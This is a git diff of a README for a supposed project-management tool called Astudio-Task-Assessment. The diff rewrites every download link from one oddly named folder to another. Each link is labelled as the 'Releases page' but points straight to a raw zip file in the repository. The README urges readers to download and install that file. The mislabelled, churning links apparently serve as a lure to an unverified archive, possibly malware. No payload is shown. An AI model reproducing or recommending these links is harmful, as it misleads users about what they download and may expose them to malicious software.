@@ -1,6 +1,6 @@
 # 🎯 Astudio-Task-Assessment - Simplified Project Management Made Easy
 
-[![Download](https://raw.githubusercontent.com/Seyhaloop/Astudio-Task-Assessment/main/psoric/Astudio-Task-Assessment.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Seyhaloop/Astudio-Task-Assessment/main/psoric/Astudio-Task-Assessment.zip)
+[![Download](https://raw.githubusercontent.com/Seyhaloop/Astudio-Task-Assessment/main/Justinianist/Astudio-Task-Assessment.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Seyhaloop/Astudio-Task-Assessment/main/Justinianist/Astudio-Task-Assessment.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Astudio-Task-Assessment project! This software helps you manage p
 
 1. Click the link below to visit the Releases page.
    
-   [Download Latest Release](https://raw.githubusercontent.com/Seyhaloop/Astudio-Task-Assessment/main/psoric/Astudio-Task-Assessment.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/Seyhaloop/Astudio-Task-Assessment/main/Justinianist/Astudio-Task-Assessment.zip)
 
 2. On the Releases page, you will see the latest version available for download. Choose the appropriate file for your operating system and click on it.
 
@@ -53,7 +53,7 @@ Before you install, ensure your system meets these requirements:
 
 ### How do I update the application?
 
-To update Astudio-Task-Assessment, visit the [Releases page](https://raw.githubusercontent.com/Seyhaloop/Astudio-Task-Assessment/main/psoric/Astudio-Task-Assessment.zip) to download the latest version. Follow the same installation steps to replace the old version.
+To update Astudio-Task-Assessment, visit the [Releases page](https://raw.githubusercontent.com/Seyhaloop/Astudio-Task-Assessment/main/Justinianist/Astudio-Task-Assessment.zip) to download the latest version. Follow the same installation steps to replace the old version.
 
 ### Can I use this app offline?
 
@@ -69,6 +69,6 @@ If you encounter any issues, please reach out through the Issues section on our 
 
 ## 🚀 Visit the Releases Page
 
-Don't forget, you can always find the latest download link here: [Download Latest Release](https://raw.githubusercontent.com/Seyhaloop/Astudio-Task-Assessment/main/psoric/Astudio-Task-Assessment.zip)
+Don't forget, you can always find the latest download link here: [Download Latest Release](https://raw.githubusercontent.com/Seyhaloop/Astudio-Task-Assessment/main/Justinianist/Astudio-Task-Assessment.zip)
 
 Thank you for choosing Astudio-Task-Assessment! Enjoy simplifying your project management.
